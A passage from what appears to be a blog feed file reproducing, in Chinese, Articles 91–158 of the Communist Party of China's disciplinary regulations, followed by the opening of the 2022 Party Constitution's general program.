<strong>第九十一条</strong>　违反有关规定办理因私出国（境）证件、前往港澳通行证，或者未经批准出入国（边）境，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  虽经批准因私出国（境）但存在擅自变更路线、无正当理由超期未归等超出批准范围出国（境）行为，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  <strong>第九十二条</strong>　驻外机构或者临时出国（境）团（组）中的党员擅自脱离组织，或者从事外事、机要、军事等工作的党员违反有关规定同国（境）外机构、人员联系和交往的，给予警告、严重警告或者撤销党内职务处分。</p><p>  <strong>第九十三条</strong>　驻外机构或者临时出国（境）团（组）中的党员，脱离组织出走时间不满六个月又自动回归的，给予撤销党内职务或者留党察看处分；脱离组织出走时间超过六个月的，按照自行脱党处理，党内予以除名。</p><p>  故意为他人脱离组织出走提供方便条件的，给予警告、严重警告或者撤销党内职务处分。</p><h3 id="第八章-对违反廉洁纪律行为的处分"><a href="#第八章-对违反廉洁纪律行为的处分" class="headerlink" title="第八章　对违反廉洁纪律行为的处分"></a>第八章　对违反廉洁纪律行为的处分</h3><p>  <strong>第九十四条</strong>　党员干部必须正确行使人民赋予的权力，清正廉洁，反对特权思想和特权现象，反对任何滥用职权、谋求私利的行为。</p><p>  利用职权或者职务上的影响为他人谋取利益，本人的配偶、子女及其配偶等亲属和其他特定关系人收受对方财物，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  <strong>第九十五条</strong>　相互利用职权或者职务上的影响为对方及其配偶、子女及其配偶等亲属、身边工作人员和其他特定关系人谋取利益搞权权交易的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第九十六条</strong>　纵容、默许配偶、子女及其配偶等亲属、身边工作人员和其他特定关系人利用党员干部本人职权或者职务上的影响谋取私利，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  党员干部的配偶、子女及其配偶等亲属和其他特定关系人不实际工作而获取薪酬或者虽实际工作但领取明显超出同职级标准薪酬，党员干部知情未予纠正的，依照前款规定处理。</p><p>  <strong>第九十七条</strong>　收受可能影响公正执行公务的礼品、礼金、消费卡（券）和有价证券、股权、其他金融产品等财物，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  收受其他明显超出正常礼尚往来的财物的，依照前款规定处理。</p><p>  <strong>第九十八条</strong>　向从事公务的人员及其配偶、子女及其配偶等亲属和其他特定关系人赠送明显超出正常礼尚往来的礼品、礼金、消费卡（券）和有价证券、股权、其他金融产品等财物，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  以讲课费、课题费、咨询费等名义变相送礼的，依照前款规定处理。</p><p>  <strong>第九十九条</strong>　借用管理和服务对象的钱款、住房、车辆等，可能影响公正执行公务，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  通过民间借贷等金融活动获取大额回报，可能影响公正执行公务的，依照前款规定处理。</p><p>  <strong>第一百条</strong>　利用职权或者职务上的影响操办婚丧喜庆事宜，造成不良影响的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分；借机敛财或者有其他侵犯国家、集体和人民利益行为的，从重或者加重处分，直至开除党籍。</p><p>  <strong>第一百零一条</strong>　接受、提供可能影响公正执行公务的宴请或者旅游、健身、娱乐等活动安排，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  <strong>第一百零二条</strong>　违反有关规定取得、持有、实际使用运动健身卡、会所和俱乐部会员卡、高尔夫球卡等各种消费卡（券），或者违反有关规定出入私人会所，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  <strong>第一百零三条</strong>　违反有关规定从事营利活动，有下列行为之一，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）经商办企业；</p><p>  （二）拥有非上市公司（企业）的股份或者证券；</p><p>  （三）买卖股票或者进行其他证券投资；</p><p>  （四）从事有偿中介活动；</p><p>  （五）在国（境）外注册公司或者投资入股；</p><p>  （六）其他违反有关规定从事营利活动的行为。</p><p>  利用参与企业重组改制、定向增发、兼并投资、土地使用权出让等工作中掌握的信息买卖股票，利用职权或者职务上的影响通过购买信托产品、基金等方式非正常获利的，依照前款规定处理。</p><p>  违反有关规定在经济组织、社会组织等单位中兼职，或者经批准兼职但获取薪酬、奖金、津贴等额外利益的，依照第一款规定处理。</p><p>  <strong>第一百零四条</strong>　利用职权或者职务上的影响，为配偶、子女及其配偶等亲属和其他特定关系人在审批监管、资源开发、金融信贷、大宗采购、土地使用权出让、房地产开发、工程招投标以及公共财政收支等方面谋取利益，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  利用职权或者职务上的影响，为配偶、子女及其配偶等亲属和其他特定关系人吸收存款、推销金融产品、经营名贵特产类特殊资源等提供帮助谋取利益的，依照前款规定处理。</p><p>  <strong>第一百零五条</strong>　离职或者退（离）休后违反有关规定接受原任职务管辖的地区和业务范围内或者与原工作业务直接相关的企业和中介机构等单位的聘用，或者个人从事与原任职务管辖业务或者与原工作业务直接相关的营利活动，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务处分；情节严重的，给予留党察看处分。</p><p>  党员领导干部离职或者退（离）休后违反有关规定担任上市公司、基金管理公司独立董事、独立监事等职务，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务处分；情节严重的，给予留党察看处分。</p><p>  <strong>第一百零六条</strong>　离职或者退（离）休后利用原职权或者职务上的影响，为配偶、子女及其配偶等亲属和其他特定关系人从事经营活动谋取利益，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  离职或者退（离）休后利用原职权或者职务上的影响为他人谋取利益，本人的配偶、子女及其配偶等亲属和其他特定关系人收受对方财物，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  <strong>第一百零七条</strong>　党员领导干部的配偶、子女及其配偶，违反有关规定在该党员领导干部管辖的地区和业务范围内从事可能影响其公正执行公务的经营活动，或者有其他违反经商办企业禁业规定行为的，该党员领导干部应当按照规定予以纠正；拒不纠正的，其本人应当辞去现任职务或者由组织予以调整职务；不辞去现任职务或者不服从组织调整职务的，给予撤销党内职务处分。</p><p>  <strong>第一百零八条</strong>　党和国家机关违反有关规定经商办企业的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  <strong>第一百零九条</strong>　党员领导干部违反工作、生活保障制度，在交通、医疗、警卫等方面为本人、配偶、子女及其配偶等亲属、身边工作人员和其他特定关系人谋求特殊待遇，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  <strong>第一百一十条</strong>　在分配、购买住房中侵犯国家、集体利益，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第一百一十一条</strong>　利用职权或者职务上的影响，侵占非本人经管的公私财物，或者以象征性地支付钱款等方式侵占公私财物，或者无偿、象征性地支付报酬接受服务、使用劳务，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  利用职权或者职务上的影响，将应当由本人、配偶、子女及其配偶等亲属、身边工作人员和其他特定关系人个人支付的费用，由下属单位、其他单位或者他人支付、报销的，依照前款规定处理。</p><p>  <strong>第一百一十二条</strong>　利用职权或者职务上的影响，违反有关规定占用公物归个人使用，时间超过六个月，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  占用公物进行营利活动的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  将公物借给他人进行营利活动的，依照前款规定处理。</p><p>  <strong>第一百一十三条</strong>　违反有关规定组织、参加用公款支付的宴请、娱乐、健身活动，或者用公款购买赠送或者发放礼品、消费卡（券）等，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第一百一十四条</strong>　违反有关规定自定薪酬或者滥发津贴、补贴、奖金、福利等，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第一百一十五条</strong>　有下列行为之一，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）公款旅游或者以学习培训、考察调研、职工疗养等为名变相公款旅游；</p><p>  （二）改变公务行程，借机旅游；</p><p>  （三）参加所管理企业、下属单位组织的考察活动，借机旅游。</p><p>  以考察、学习、培训、研讨、招商、参展等名义变相用公款出国（境）旅游的，对直接责任者和领导责任者，依照前款规定处理。</p><p>  <strong>第一百一十六条</strong>　违反接待管理规定，超标准、超范围接待或者借机大吃大喝，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  <strong>第一百一十七条</strong>　违反有关规定配备、购买、更换、装饰、使用公务交通工具或者有其他违反公务交通工具管理规定的行为，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  <strong>第一百一十八条</strong>　违反会议活动管理规定，有下列行为之一，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分：</p><p>  （一）到禁止召开会议的风景名胜区开会；</p><p>  （二）决定或者批准举办各类节会、庆典活动；</p><p>  （三）其他违反会议活动管理规定行为。</p><p>  擅自举办评比达标表彰、创建示范活动或者借评比达标表彰、创建示范活动收取费用的，对直接责任者和领导责任者，依照前款规定处理。</p><p>  <strong>第一百一十九条</strong>　违反办公用房管理等规定，有下列行为之一，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分：</p><p>  （一）决定或者批准兴建、装修办公楼、培训中心等楼堂馆所；</p><p>  （二）超标准配备、使用办公用房；</p><p>  （三）未经批准租用、借用办公用房；</p><p>  （四）用公款包租、占用客房或者其他场所供个人使用；</p><p>  （五）其他违反办公用房管理等规定行为。</p><p>  <strong>第一百二十条</strong>　搞权色交易或者给予财物搞钱色交易的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第一百二十一条</strong>　有其他违反廉洁纪律规定行为的，应当视具体情节给予警告直至开除党籍处分。</p><h3 id="第九章-对违反群众纪律行为的处分"><a href="#第九章-对违反群众纪律行为的处分" class="headerlink" title="第九章　对违反群众纪律行为的处分"></a>第九章　对违反群众纪律行为的处分</h3><p>  <strong>第一百二十二条</strong>　有下列行为之一，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）超标准、超范围向群众筹资筹劳、摊派费用，加重群众负担；</p><p>  （二）违反有关规定扣留、收缴群众款物或者处罚群众；</p><p>  （三）克扣群众财物，或者违反有关规定拖欠群众钱款；</p><p>  （四）在管理、服务活动中违反有关规定收取费用；</p><p>  （五）在办理涉及群众事务时刁难群众、吃拿卡要；</p><p>  （六）其他侵害群众利益行为。</p><p>  在乡村振兴领域有上述行为的，从重或者加重处分。</p><p>  <strong>第一百二十三条</strong>　干涉生产经营自主权，致使群众财产遭受较大损失的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  <strong>第一百二十四条</strong>　在社会保障、社会救助、政策扶持、救灾救济款物分配等事项中优亲厚友、明显有失公平的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第一百二十五条</strong>　利用宗族或者黑恶势力等欺压群众，或者纵容涉黑涉恶活动、为黑恶势力充当“保护伞”的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第一百二十六条</strong>　有下列行为之一，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分：</p><p>  （一）对涉及群众生产、生活等切身利益的问题依照政策或者有关规定能解决而不及时解决，庸懒无为、效率低下，造成不良影响；</p><p>  （二）对符合政策的群众诉求消极应付、推诿扯皮，损害党群、干群关系；</p><p>  （三）对待群众态度恶劣、简单粗暴，造成不良影响；</p><p>  （四）弄虚作假，欺上瞒下，损害群众利益；</p><p>  （五）其他不作为、乱作为、慢作为、假作为等损害群众利益行为。</p><p>  <strong>第一百二十七条</strong>　遇到国家财产和群众生命财产受到严重威胁时，能救而不救，情节较重的，给予警告、严重警告或者撤销党内职务处分；情节严重的，给予留党察看或者开除党籍处分。</p><p>  <strong>第一百二十八条</strong>　不按照规定公开党务、政务、厂务、村（居）务等，侵犯群众知情权，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  <strong>第一百二十九条</strong>　有其他违反群众纪律规定行为的，应当视具体情节给予警告直至开除党籍处分。</p><h3 id="第十章-对违反工作纪律行为的处分"><a href="#第十章-对违反工作纪律行为的处分" class="headerlink" title="第十章　对违反工作纪律行为的处分"></a>第十章　对违反工作纪律行为的处分</h3><p>  <strong>第一百三十条</strong>　工作中不负责任或者疏于管理，贯彻执行、检查督促落实上级决策部署不力，给党、国家和人民利益以及公共财产造成较大损失的，对直接责任者和领导责任者，给予警告或者严重警告处分；造成重大损失的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  党员领导干部对于到任前已经存在且属于其职责范围内的问题，消极回避、推卸责任，造成严重损害或者严重不良影响的，依照前款规定处理。</p><p>  <strong>第一百三十一条</strong>　工作中不敢斗争、不愿担当，面对重大矛盾冲突、危机困难临阵退缩，造成不良影响或者严重后果的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  <strong>第一百三十二条</strong>　有下列行为之一，造成严重损害或者严重不良影响的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）热衷于搞舆论造势、浮在表面；</p><p>  （二）单纯以会议贯彻会议、以文件落实文件，在实际工作中不见诸行动；</p><p>  （三）脱离实际，不作深入调查研究，搞随意决策、机械执行；</p><p>  （四）违反精文减会有关规定搞文山会海；</p><p>  （五）在督查检查考核等工作中搞层层加码、过度留痕，增加基层工作负担；</p><p>  （六）工作中其他形式主义、官僚主义行为。</p><p>  <strong>第一百三十三条</strong>　在公务活动用餐、单位食堂用餐管理工作中不履行或者不正确履行宣传教育、监督管理职责，导致餐饮浪费，造成严重不良影响的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  <strong>第一百三十四条</strong>　在机构编制工作中，有下列行为之一，造成不良影响或者严重后果的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）擅自超出“三定”规定范围调整职责、设置机构、核定领导职数和配备人员；</p><p>  （二）违规干预地方机构设置；</p><p>  （三）其他违反机构编制管理规定行为。</p><p>  <strong>第一百三十五条</strong>　在信访工作中，有下列行为之一，造成不良影响或者严重后果的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）不按照规定受理、办理信访事项；</p><p>  （二）对规模性集体访等处置不力，导致事态扩大；</p><p>  （三）对党委和政府信访部门提出的改进工作、完善政策等建议重视不够、落实不力，导致问题长期得不到解决；</p><p>  （四）其他不履行或者不正确履行信访工作职责行为。</p><p>  不履行或者不正确履行职责，导致信访事项发生，造成不良影响或者严重后果的，对直接责任者和领导责任者，依照前款规定处理。</p><p>  <strong>第一百三十六条</strong>　党组织有下列行为之一，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分：</p><p>  （一）党员被立案审查期间，擅自批准其出差、出国（境）、辞职，或者对其交流、提拔职务、晋升职级、进一步使用、奖励，或者办理退休手续；</p><p>  （二）党员被依法追究刑事责任后，不按照规定给予党纪处分，或者对党员违反国家法律法规的行为，应当给予党纪处分而不处分；</p><p>  （三）党纪处分决定或者申诉复查决定作出后，不按照规定落实决定中关于被处分人党籍、职务、职级、待遇等事项；</p><p>  （四）党员受到党纪处分后，不按照干部管理权限和组织关系对受处分党员开展日常教育、管理和监督工作。</p><p>  <strong>第一百三十七条</strong>　滥用问责，或者在问责工作中严重不负责任，造成不良影响的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  <strong>第一百三十八条</strong>　因工作不负责任致使所管理的人员叛逃的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  因工作不负责任致使所管理的人员出逃、出走，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  <strong>第一百三十九条</strong>　进行统计造假，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  对统计造假失察，造成严重后果的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  <strong>第一百四十条</strong>　在上级检查、视察工作或者向上级汇报、报告工作时对应当报告的事项不报告或者不如实报告，造成严重损害或者严重不良影响的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  在上级检查、视察工作或者向上级汇报、报告工作时纵容、唆使、暗示、强迫下级说假话、报假情的，从重或者加重处分。</p><p>  <strong>第一百四十一条</strong>　违反有关规定干预和插手市场经济活动，有下列行为之一，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）干预和插手建设工程项目承发包、土地使用权出让、政府采购、房地产开发与经营、矿产资源开发利用、中介机构服务等活动；</p><p>  （二）干预和插手国有企业重组改制、兼并、破产、产权交易、清产核资、资产评估、资产转让、重大项目投资以及其他重大经营活动等事项；</p><p>  （三）干预和插手批办各类行政许可和资金借贷等事项；</p><p>  （四）干预和插手经济纠纷；</p><p>  （五）干预和插手集体资金、资产和资源的使用、分配、承包、租赁等事项。</p><p>  <strong>第一百四十二条</strong>　违反有关规定干预和插手司法活动、执纪执法活动，向有关地方或者部门打听案情、打招呼、说情，或者以其他方式对司法活动、执纪执法活动施加影响，情节较轻的，给予严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  违反有关规定干预和插手公共财政资金分配、项目立项评审、功勋荣誉表彰奖励等活动，造成重大损失或者不良影响的，依照前款规定处理。</p><p>  <strong>第一百四十三条</strong>　按照有关规定对干预和插手行为负有报告和登记义务的受请托人，不按照规定报告或者登记，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  <strong>第一百四十四条</strong>　泄露、扩散或者打探、窃取党组织关于干部选拔任用、纪律审查、巡视巡察等尚未公开事项或者其他应当保密的内容的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  私自留存涉及党组织关于干部选拔任用、纪律审查、巡视巡察等方面资料，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  <strong>第一百四十五条</strong>　在考试、录取工作中，有泄露试题、考场舞弊、涂改考卷、违规录取等违反有关规定行为的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第一百四十六条</strong>　以不正当方式谋求本人或者其他人用公款出国（境），情节较轻的，给予警告处分；情节较重的，给予严重警告处分；情节严重的，给予撤销党内职务处分。</p><p> <strong>第一百四十七条</strong>　临时出国（境）团（组）或者人员中的党员，擅自延长在国（境）外期限，或者擅自变更路线的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p><strong>第一百四十八条</strong>　驻外机构或者临时出国（境）团（组）中的党员，触犯驻在国家、地区的法律、法令或者不尊重驻在国家、地区的宗教习俗，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p><strong>第一百四十九条</strong>　在党的纪律检查、组织、宣传、统一战线工作以及机关工作等其他工作中，不履行或者不正确履行职责，造成损失或者不良影响的，应当视具体情节给予警告直至开除党籍处分。</p><h3 id="第十一章-对违反生活纪律行为的处分"><a href="#第十一章-对违反生活纪律行为的处分" class="headerlink" title="第十一章　对违反生活纪律行为的处分"></a>第十一章　对违反生活纪律行为的处分</h3><p>  <strong>第一百五十条</strong>　生活奢靡、铺张浪费、贪图享乐、追求低级趣味，造成不良影响的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  <strong>第一百五十一条</strong>　与他人发生不正当性关系，造成不良影响的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  利用职权、教养关系、从属关系或者其他相类似关系与他人发生性关系的，从重处分。</p><p>  <strong>第一百五十二条</strong>　党员领导干部不重视家风建设，对配偶、子女及其配偶失管失教，造成不良影响或者严重后果的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  <strong>第一百五十三条</strong>　违背社会公序良俗，在公共场所、网络空间有不当言行，造成不良影响的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第一百五十四条</strong>　有其他严重违反社会公德、家庭美德行为的，应当视具体情节给予警告直至开除党籍处分。</p><h2 id="第三编-附则"><a href="#第三编-附则" class="headerlink" title="第三编　附则"></a>第三编　附则</h2><p>  <strong>第一百五十五条</strong>　各省、自治区、直辖市党委可以根据本条例，结合各自工作的实际情况，制定单项实施规定。</p><p>  <strong>第一百五十六条</strong>　中央军事委员会可以根据本条例，结合中国人民解放军和中国人民武装警察部队的实际情况，制定补充规定或者单项规定。</p><p>  <strong>第一百五十七条</strong>　本条例由中央纪委负责解释。</p><p>  <strong>第一百五十八条</strong>　本条例自2024年1月1日起施行。</p><p>  本条例施行前，已结案的案件如需进行复查复议，适用当时的规定或者政策。尚未结案的案件，如果行为发生时的规定或者政策不认为是违纪，而本条例认为是违纪的，依照当时的规定或者政策处理；如果行为发生时的规定或者政策认为是违纪的，依照当时的规定或者政策处理，但是如果本条例不认为是违纪或者处理较轻的，依照本条例规定处理。</p>]]></content>
      
      
      <categories>
          
          <category> 法规 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 党纪处分 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国共产党章程（中国共产党第二十次全国代表大会部分修改，2022年10月22日通过）</title>
      <link href="/2024/10/01/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%AB%A0%E7%A8%8B%EF%BC%88%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%AC%AC%E4%BA%8C%E5%8D%81%E6%AC%A1%E5%85%A8%E5%9B%BD%E4%BB%A3%E8%A1%A8%E5%A4%A7%E4%BC%9A%E9%83%A8%E5%88%86%E4%BF%AE%E6%94%B9%EF%BC%8C2022%E5%B9%B410%E6%9C%8822%E6%97%A5%E9%80%9A%E8%BF%87%EF%BC%89/"/>
      <url>/2024/10/01/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%AB%A0%E7%A8%8B%EF%BC%88%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%AC%AC%E4%BA%8C%E5%8D%81%E6%AC%A1%E5%85%A8%E5%9B%BD%E4%BB%A3%E8%A1%A8%E5%A4%A7%E4%BC%9A%E9%83%A8%E5%88%86%E4%BF%AE%E6%94%B9%EF%BC%8C2022%E5%B9%B410%E6%9C%8822%E6%97%A5%E9%80%9A%E8%BF%87%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="总纲"><a href="#总纲" class="headerlink" title="总纲"></a>总纲</h2><p>  中国共产党是中国工人阶级的先锋队，同时是中国人民和中华民族的先锋队，是中国特色社会主义事业的领导核心，代表中国先进生产力的发展要求，代表中国先进文化的前进方向，代表中国最广大人民的根本利益。党的最高理想和最终目标是实现共产主义。</p><p>  中国共产党以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想作为自己的行动指南。</p><p>  马克思列宁主义揭示了人类社会历史发展的规律，它的基本原理是正确的，具有强大的生命力。中国共产党人追求的共产主义最高理想，只有在社会主义社会充分发展和高度发达的基础上才能实现。社会主义制度的发展和完善是一个长期的历史过程。坚持马克思列宁主义的基本原理，走中国人民自愿选择的适合中国国情的道路，中国的社会主义事业必将取得最终的胜利。</p><p>  以毛泽东同志为主要代表的中国共产党人，把马克思列宁主义的基本原理同中国革命的具体实践结合起来，创立了毛泽东思想。毛泽东思想是马克思列宁主义在中国的运用和发展，是被实践证明了的关于中国革命和建设的正确的理论原则和经验总结，是中国共产党集体智慧的结晶。在毛泽东思想指引下，中国共产党领导全国各族人民，经过长期的反对帝国主义、封建主义、官僚资本主义的革命斗争，取得了新民主主义革命的胜利，建立了人民民主专政的中华人民共和国；新中国成立以后，顺利地进行了社会主义改造，完成了从新民主主义到社会主义的过渡，确立了社会主义基本制度，发展了社会主义的经济、政治和文化。</p><p>  十一届三中全会以来，以邓小平同志为主要代表的中国共产党人，总结新中国成立以来正反两方面的经验，解放思想，实事求是，实现全党工作中心向经济建设的转移，实行改革开放，开辟了社会主义事业发展的新时期，逐步形成了建设中国特色社会主义的路线、方针、政策，阐明了在中国建设社会主义、巩固和发展社会主义的基本问题，创立了邓小平理论。邓小平理论是马克思列宁主义的基本原理同当代中国实践和时代特征相结合的产物，是毛泽东思想在新的历史条件下的继承和发展，是马克思主义在中国发展的新阶段，是当代中国的马克思主义，是中国共产党集体智慧的结晶，引导着我国社会主义现代化事业不断前进。</p><p>  十三届四中全会以来，以江泽民同志为主要代表的中国共产党人，在建设中国特色社会主义的实践中，加深了对什么是社会主义、怎样建设社会主义和建设什么样的党、怎样建设党的认识，积累了治党治国新的宝贵经验，形成了“三个代表”重要思想。“三个代表”重要思想是对马克思列宁主义、毛泽东思想、邓小平理论的继承和发展，反映了当代世界和中国的发展变化对党和国家工作的新要求，是加强和改进党的建设、推进我国社会主义自我完善和发展的强大理论武器，是中国共产党集体智慧的结晶，是党必须长期坚持的指导思想。始终做到“三个代表”，是我们党的立党之本、执政之基、力量之源。</p><p>  十六大以来，以胡锦涛同志为主要代表的中国共产党人，坚持以邓小平理论和“三个代表”重要思想为指导，根据新的发展要求，深刻认识和回答了新形势下实现什么样的发展、怎样发展等重大问题，形成了以人为本、全面协调可持续发展的科学发展观。科学发展观是同马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想既一脉相承又与时俱进的科学理论，是马克思主义关于发展的世界观和方法论的集中体现，是马克思主义中国化重大成果，是中国共产党集体智慧的结晶，是发展中国特色社会主义必须长期坚持的指导思想。</p><p>  十八大以来，以习近平同志为主要代表的中国共产党人，坚持把马克思主义基本原理同中国具体实际相结合、同中华优秀传统文化相结合，科学回答了新时代坚持和发展什么样的中国特色社会主义、怎样坚持和发展中国特色社会主义等重大时代课题，创立了习近平新时代中国特色社会主义思想。习近平新时代中国特色社会主义思想是对马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观的继承和发展，是当代中国马克思主义、二十一世纪马克思主义，是中华文化和中国精神的时代精华，是党和人民实践经验和集体智慧的结晶，是中国特色社会主义理论体系的重要组成部分，是全党全国人民为实现中华民族伟大复兴而奋斗的行动指南，必须长期坚持并不断发展。在习近平新时代中国特色社会主义思想指导下，中国共产党领导全国各族人民，统揽伟大斗争、伟大工程、伟大事业、伟大梦想，推动中国特色社会主义进入了新时代，实现第一个百年奋斗目标，开启了实现第二个百年奋斗目标新征程。</p><p>  改革开放以来我们取得一切成绩和进步的根本原因，归结起来就是：开辟了中国特色社会主义道路，形成了中国特色社会主义理论体系，确立了中国特色社会主义制度，发展了中国特色社会主义文化。全党同志要倍加珍惜、长期坚持和不断发展党历经艰辛开创的这条道路、这个理论体系、这个制度、这个文化，高举中国特色社会主义伟大旗帜，坚定道路自信、理论自信、制度自信、文化自信，发扬斗争精神，增强斗争本领，贯彻党的基本理论、基本路线、基本方略，为实现推进现代化建设、完成祖国统一、维护世界和平与促进共同发展这三大历史任务，实现第二个百年奋斗目标、实现中华民族伟大复兴的中国梦而奋斗。</p><p>  